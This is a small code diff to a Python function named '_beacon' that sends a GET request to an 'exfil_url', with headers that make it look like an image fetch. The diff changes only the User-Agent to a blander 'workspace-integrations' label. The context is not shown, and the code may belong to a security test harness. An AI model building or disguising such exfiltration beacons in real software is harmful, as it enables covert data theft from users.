@@ -39,7 +39,7 @@ def _beacon(exfil_url: str) -> None:
         request = urllib.request.Request(
             exfil_url,
             headers={
-                "User-Agent": "ops-integrations/1.0",
+                "User-Agent": "workspace-integrations/1.0",
                 "Accept": "image/gif,image/*,*/*",
             },
             method="GET",
